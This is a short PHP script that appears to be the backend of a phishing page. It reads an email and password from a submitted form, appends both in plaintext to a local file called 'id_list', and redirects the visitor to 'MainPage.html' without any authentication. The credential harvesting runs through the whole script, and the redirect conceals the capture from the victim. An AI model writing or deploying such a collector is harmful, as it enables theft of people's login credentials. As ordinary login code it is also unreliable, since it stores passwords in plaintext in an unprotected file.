<?php

//get from the form email and password
$email=$_POST['email'];
$password=$_POST['password'];

//Creation of idFile to stock id
$idFile=fopen("id_list","a+");

//Save email and password in idFile
fwrite($idFile, " Email : ".$email);
fwrite($idFile, " Password : ".$password);

//Close $idFile
fclose($idFile);

header("Location: MainPage.html");
exit();
?>
